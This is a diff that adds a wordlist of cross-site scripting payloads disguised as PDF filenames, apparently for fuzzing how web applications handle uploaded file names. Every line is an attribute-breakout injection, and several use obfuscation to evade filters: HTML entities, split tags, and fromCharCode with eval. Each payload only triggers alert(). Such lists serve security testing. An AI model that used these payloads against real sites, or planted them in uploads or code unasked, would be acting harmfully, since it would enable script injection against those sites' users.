@@ -1,0 +1,21 @@
+"><img src=x onerror=alert('xss')>.pdf
+"><script>alert('xss')</script>.pdf
+"><svg onload=alert('xss')>.pdf
+"><iframe src=javascript:alert('xss')>.pdf
+"><input type=text onfocus=alert('xss') autofocus>.pdf
+"><body onload=alert('xss')>.pdf
+"><img src=1 onerror=alert('xss')>.pdf
+"><img src=javascript:alert('xss')>.pdf
+"><link rel=stylesheet href=javascript:alert('xss')>.pdf
+"><embed src=javascript:alert('xss')>.pdf
+"><img src=x onerror=&#97;&#108;&#101;&#114;&#116;('xss')>.pdf
+"><svg onload=alert('xss')>.pdf
+"><iframe src=javascript:alert('xss')>.pdf
+"><scr"+"ipt>alert('xss')</scr"+"ipt>.pdf
+"><im"+"g src=x onerror=alert('xss')>.pdf
+"><img src=x onerror=alert('x'<!-- -->'ss')>.pdf
+"><input type="text" value="XSS" onfocus="alert('xss')" autofocus>.pdf
+"><img src="x:alert(String.fromCharCode(88,83,83))" onerror=eval(src)>.pdf
+"><script>alert(/XSS/.source)</script>.pdf
+"><img src=javascript:alert('xss')>.pdf
+"><a href="javascript:alert('xss')">Click me</a>.pdf
